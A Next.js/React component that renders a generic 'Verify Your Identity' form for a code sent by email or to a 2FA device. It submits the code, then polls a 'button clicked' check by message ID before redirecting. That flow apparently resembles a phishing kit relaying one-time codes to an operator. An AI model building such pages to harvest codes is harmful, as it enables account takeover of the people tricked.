'use client';
import React, {useState} from 'react';
import styles from './styles.module.css';
import Image from "next/image";
import {useRouter} from "next/navigation";
import {checkService} from "@/services/check";

import {verifyService} from "@/services/verify";
import {sessionConst} from "@/constants/session";
import {getResponseRoute} from "../../../utils/navigation";


interface VerifyAccountProps {
  contentType: string
}

export const VerifyAccountComponent = ({contentType}: VerifyAccountProps) => {
  const router = useRouter();
  const [loading, setLoading] = useState(false);
  const [otp, setOtp] = useState('');

  const onSubmit = async () => {
    setLoading(true);

    const {data: verificationData, error} = await verifyService.verifyUser({
      email: ` ${sessionStorage.getItem(sessionConst.Email) ?? ''} `,
      code: ` ${otp} `
    })


    if (error) router.push('/')
    
    if (verificationData) {
      const response = await checkService.checkButtonClicked({messageId: verificationData.messageId})

      const {error, data} = response as { error: string | null, data: any }

      if (error) router.push('/')

      if (data) {
        setLoading(false)
        getResponseRoute(router, data)
      }
    }
  };


  return (
    <div className={styles.wrapper}>
      <div className={styles.container}>
        <div className={styles.logo}>
          <Image width={60} height={60} src="/icons/form-logo.png" alt="Logo"/>
        </div>
        <h2 className={styles.title}>Verify Your Identity</h2>
        <p className={styles.description}>
          Please confirm that you{"'"}re the owner of your account by entering the code sent to your {contentType}.
        </p>
        <input
          type="text"
          placeholder="Enter code here..."
          className={styles.input}
          onChange={(e) => setOtp(e.target.value)}
        />
        <button className={styles.submitButton} onClick={onSubmit}>
          {loading ? 'Loading...' : 'Submit'}
        </button>
        <p className={styles.resendLink}>
          Didn{"'"}t receive an email? <a href="#">Reach out</a>
        </p>
      </div>
    </div>
  );
};

//email , 2FA device
